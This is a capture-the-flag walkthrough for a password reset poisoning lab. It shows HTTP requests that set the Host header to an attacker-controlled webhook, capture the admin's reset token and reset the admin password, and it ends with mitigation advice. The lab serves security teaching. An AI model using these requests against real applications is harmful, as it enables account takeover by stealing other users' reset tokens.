# Lab 5 - Password Reset Poisoning Walkthrough

**Vulnerability:** Host Header Injection (Password Reset Poisoning)
**Difficulty:** Hard
**Points:** 500

## Challenge Scenario
The application has a "Forgot Password" feature that allows users to request a password reset link. The server generates the link using the HTTP `Host` header supplied by the user. An automated bot (simulating an administrator) will click on any reset link it receives.

## Walkthrough

1.  **Analyze the Target:**
    Go to the "Forgot Password" section.
    If you enter a valid username (like `admin`), the server generates a reset link and "emails" it.
    
2.  **Intercept the Request:**
    Using Burp Suite, intercept the request to `/api/forgot-password`.
    
    ```http
    POST /api/forgot-password HTTP/1.1
    Host: localhost:8005
    Content-Type: application/json
    
    {"username":"admin"}
    ```
    
3.  **Host Header Poisoning:**
    The vulnerability is that the server trusts the `Host` header when building the link sent in the email.
    If we change the `Host` header to an attacker-controlled server (e.g., a webhook URL from webhook.site, ngrok, or a local netcat listener), the server will generate a link like `http://attacker.com/api/reset-password?token=xyz` and send it to the admin.
    
    *Modified Request:*
    ```http
    POST /api/forgot-password HTTP/1.1
    Host: your-webhook-url.com
    Content-Type: application/json
    
    {"username":"admin"}
    ```
    
4.  **Capture the Token:**
    Within 10 seconds, the simulated Admin bot will "click" the link it received in its email.
    Check your webhook/listener logs. You will see an incoming `GET` request containing the secret reset token.
    `GET /api/reset-password?token=xyz123abc`
    
5.  **Reset the Password:**
    Now that you have the valid token, use it to reset the admin's password.
    Make a POST request to the *real* server:
    
    ```http
    POST /api/reset-password HTTP/1.1
    Host: localhost:8005
    Content-Type: application/json
    
    {"token":"xyz123abc", "new_password":"hacked"}
    ```
    
6.  **Retrieve Flag:**
    Log in with the username `admin` and the password `hacked`.
    The profile dashboard will reveal the secret flag.

## Mitigation
1. **Never trust the `Host` header** for generating sensitive URLs like password reset links, OAuth callbacks, or email confirmations.
2. Use a statically configured, hardcoded base URL (e.g., in environment variables `BASE_URL=https://nerdsctf.io`) for generating absolute links.
3. If dynamic Host headers must be supported (e.g., multi-tenant architectures), strictly validate the Host header against an allowlist of trusted domains.
